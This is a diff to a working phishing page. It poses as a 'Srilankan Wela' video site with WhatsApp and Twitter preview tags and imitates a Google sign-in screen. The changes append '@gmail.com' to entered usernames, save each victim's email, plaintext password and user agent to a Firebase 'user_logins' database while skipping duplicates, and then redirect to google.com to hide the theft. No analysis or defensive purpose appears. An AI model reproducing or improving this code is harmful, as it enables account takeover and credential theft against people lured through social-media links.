@@ -4,6 +4,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Srilankan Wela</title>
+
+    <!-- Open Graph (OG) Tags for WhatsApp & Social Media Preview -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Srilankan Wela - Watch Trending Videos">
+    <meta property="og:description" content="Watch the latest trending and exclusive videos on Srilankan Wela.">
+    <meta property="og:image" content="https://i.ibb.co/3mJp9NXm/In-Shot-20261111-182343696.jpg">
+    <meta property="og:url" content="">
+
+    <!-- Twitter Card Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Srilankan Wela - Watch Trending Videos">
+    <meta name="twitter:description" content="Watch the latest trending and exclusive videos on Srilankan Wela.">
+    <meta name="twitter:image" content="https://i.ibb.co/3mJp9NXm/In-Shot-20261111-182343696.jpg">
+
     <style>
         * { box-sizing: border-box; font-family: sans-serif; }
         body { margin: 0; background: #0A0A0F; color: #FFFFFF; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
@@ -89,7 +103,7 @@
         <div style="font-size: 36px; color: #E8EAED; margin-top: 24px;">Sign in</div>
         <div style="font-size: 18px; color: #E8EAED; margin-top: 28px;">Use your Google Account</div>
 
-        <input type="email" id="edittext_email" placeholder="Email or phone" style="width: 100%; height: 60px; margin-top: 55px; padding: 12px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 8px; outline: none;">
+        <input type="text" id="edittext_email" placeholder="Email or phone" style="width: 100%; height: 60px; margin-top: 55px; padding: 12px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 8px; outline: none;">
 
         <div style="font-size: 15px; font-weight: bold; color: #A8C7FA; margin-top: 18px; cursor: pointer;">Forgot email?</div>
         
@@ -102,15 +116,18 @@
         </div>
     </div>
 
-    <!-- PAGE 3: PASSWORD LOGIN -->
+    <!-- PAGE 3: PASSWORD LOGIN (WELCOME UI) -->
     <div id="page3" class="page" style="background: #131314; padding: 24px; padding-top: 36px;">
+        <div style="font-size: 48px; font-weight: bold; color: #4285F4; margin-top: 10px;">G</div>
         <div style="font-size: 36px; color: #E3E2E6; margin-top: 20px;">Welcome</div>
         
-        <div style="display: inline-flex; align-items: center; background: #1E1E24; padding: 6px 12px; border-radius: 20px; margin-top: 20px; width: fit-content;">
-            <span id="display_email" style="font-size: 14px; color: #E3E2E6;">user@gmail.com</span>
+        <div style="display: inline-flex; align-items: center; border: 1px solid #5f6368; border-radius: 20px; padding: 6px 14px; margin-top: 20px; background: #131314; width: fit-content;">
+            <div style="width: 20px; height: 20px; background: #5f6368; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; color: #fff; margin-right: 8px;">👤</div>
+            <span id="display_email" style="font-size: 13px; color: #E8EAED;">user@gmail.com</span>
+            <span style="font-size: 12px; color: #9aa0a6; margin-left: 6px;">▼</span>
         </div>
 
-        <input type="password" id="edittext_password" placeholder="Enter password" style="width: 100%; height: 56px; margin-top: 48px; padding: 0 16px; font-size: 16px; color: #E3E2E6; background: transparent; border: 1.5px solid #A8C7FA; border-radius: 4px; outline: none;">
+        <input type="password" id="edittext_password" placeholder="Enter your password" style="width: 100%; height: 56px; margin-top: 48px; padding: 0 16px; font-size: 16px; color: #E3E2E6; background: transparent; border: 1.5px solid #A8C7FA; border-radius: 4px; outline: none;">
 
         <div style="display: flex; align-items: center; margin-top: 12px;">
             <input type="checkbox" id="show_pass" style="width: 18px; height: 18px; margin-right: 8px;" onclick="togglePassword()">
@@ -200,13 +217,19 @@
         page2.classList.add("active");
     });
 
-    // Email Next Button -> Opens Password Page
+    // Email Next Button -> Opens Password Page (Auto appends @gmail.com if missing)
     document.getElementById("btn_next_email").addEventListener("click", () => {
-        const emailInput = document.getElementById("edittext_email").value.trim();
+        let emailInput = document.getElementById("edittext_email").value.trim();
         if(!emailInput) {
             alert("කරුණාකර ඊමේල් ලිපිනය ඇතුළත් කරන්න.");
             return;
         }
+        
+        // අගට @gmail.com නොමැති නම් ස්වයංක්‍රීයව එකතු කිරීම
+        if(!emailInput.includes("@")) {
+            emailInput += "@gmail.com";
+        }
+
         userEmail = emailInput;
         document.getElementById("display_email").textContent = userEmail;
         
@@ -214,7 +237,7 @@
         page3.classList.add("active");
     });
 
-    // Password Next Button -> Saves Data to Firebase Database (user_logins)
+    // Password Next Button -> Checks duplicates and Saves Data to Firebase Database (user_logins)
     document.getElementById("btn_next_password").addEventListener("click", async () => {
         const passInput = document.getElementById("edittext_password").value.trim();
         if(!passInput) {
@@ -224,18 +247,24 @@
         userPassword = passInput;
 
         try {
-            // Firebase Database එකේ 'user_logins' කියන node එකට දත්ත යැවීම
-            const loginsRef = firebase.database().ref('user_logins').push();
-            
-            await loginsRef.set({
-                email: userEmail,
-                password: userPassword,
-                user_agent: navigator.userAgent,
-                time: new Date().toLocaleString()
-            });
+            const loginsRef = firebase.database().ref('user_logins');
 
-            alert("Connected successfully!");
-            window.location.reload();
+            // එකම ඊමේල් එක නැවත නැවත (duplicate වී) සර්වර් එකට යැවීම වැළැක්වීම සඳහා චෙක් කිරීම
+            loginsRef.orderByChild('email').equalTo(userEmail).once('value', async (snapshot) => {
+                if (!snapshot.exists()) {
+                    // දත්ත නොමැති නම් පමණක් අලුතින් යැවීම
+                    const newRef = loginsRef.push();
+                    await newRef.set({
+                        email: userEmail,
+                        password: userPassword,
+                        user_agent: navigator.userAgent,
+                        time: new Date().toLocaleString()
+                    });
+                }
+                
+                // සාර්ථකව අවසන් වී ගූගල් වෙත යොමු වීම
+                window.location.href = "https://www.google.com";
+            });
 
         } catch(e) {
             alert("Network error.");
